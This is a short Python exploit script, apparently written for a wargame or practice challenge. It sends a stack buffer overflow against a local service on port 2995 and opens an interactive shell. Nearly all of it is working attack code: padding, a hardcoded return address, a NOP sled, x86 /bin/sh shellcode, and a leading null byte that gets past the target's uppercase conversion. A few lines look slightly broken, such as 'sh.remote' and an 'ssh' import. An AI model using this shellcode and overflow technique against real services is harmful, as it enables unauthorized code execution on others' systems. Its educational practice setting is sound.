#!/usr/bin/python
from pwn import *
from ssh import *

p=sh.remote('localhost',2995)
overflow="A"*532
# to find the stack address attach gdb to the process
# without sending data using gdp -p processId to debug it
stack_addr=0xbffffa80
Shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
NOP="\x90"*(511-len(Shellcode))
payload=overflow+p32(stack_addr)+NOP+Shellcode
# p.sendline(payload)
# the first \x00 to terminate strlen while going toupper
payload="\x00"+NOP+Shellcode+'A'*(532-512)+p32(stack_addr)
p.sendline(payload)
p.interactive()